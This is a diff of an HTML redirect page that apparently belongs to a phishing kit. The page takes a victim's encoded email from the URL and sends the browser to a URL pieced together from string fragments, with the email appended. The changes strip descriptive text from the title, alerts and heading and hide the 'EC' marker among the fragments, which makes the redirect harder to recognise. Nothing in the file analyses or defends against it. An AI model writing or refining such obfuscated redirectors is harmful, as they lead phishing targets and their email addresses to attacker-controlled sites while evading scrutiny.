@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Email Redirect</title>
+  <title>..</title>
   <script>
     // Function to split the encoded email into chunks
     function bIB(str, bits = 20) {
@@ -40,22 +40,22 @@
 
           // Define the base URL parts
           const redirectUrlBits = [
-            "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?", "", "", "", "", "", "", ""
+            "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?", "EC", "", "", "", "", "", ""
           ];
 
           // Split the encoded email into chunks using bIB
           const emailBits = bIB(encodedEmail);
 
           // Combine the base URL parts and email chunks
-          const finalUrl = combineBits(redirectUrlBits) + 'EC' + combineBits(emailBits);
+          const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);
 
           // Redirect to the final URL
           window.location.href = finalUrl;
         } else {
-          alert("Email not found after 'EC'!");
+          alert("!");
         }
       } else {
-        alert("'EC' parameter not found in the URL!");
+        alert("!");
       }
     }
 
@@ -64,6 +64,6 @@
   </script>
 </head>
 <body>
-  <h1>Redirecting...</h1>
+  <h1>...</h1>
 </body>
 </html>
